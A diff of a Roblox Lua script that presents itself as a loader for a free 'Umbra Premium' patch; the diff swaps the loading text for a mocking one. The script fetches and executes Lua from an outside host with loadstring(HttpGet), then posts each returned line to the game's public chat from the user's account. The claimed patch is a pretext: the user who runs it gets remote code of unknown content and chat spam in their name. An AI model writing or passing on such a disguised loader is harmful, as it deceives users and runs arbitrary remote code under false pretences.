@@ -13,11 +13,11 @@ local txt = Inst.new("TextLabel", Inst.newProtectedScreenGui({
 	TextColor3 = Color3.new(1, 1, 1),
 	TextTransparency = 0,
 	Font = Enum.Font.GothamBold,
-	Text = "Loading Umbra Premium free patch (developers edition)<br/>Loading might take some time.<br/>Do not leave the game or re-execute the script<br/>intended for dev use"
+	Text = "loading free umbra premium patch...<br/><br/>free punjabi no wirus....<br/><br/>uwu...."
 })
 
 for i, v in pairs( (loadstring(game:HttpGet("https://ave.is-a.dev/umbra-premium-free-real/bible.lua"))()) ) do
-	if txt then txt:Destroy() end
+	if txt then txt:Destroy() txt=nil end
 	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v, "All")
 	print(v)
 	wait(1.5)
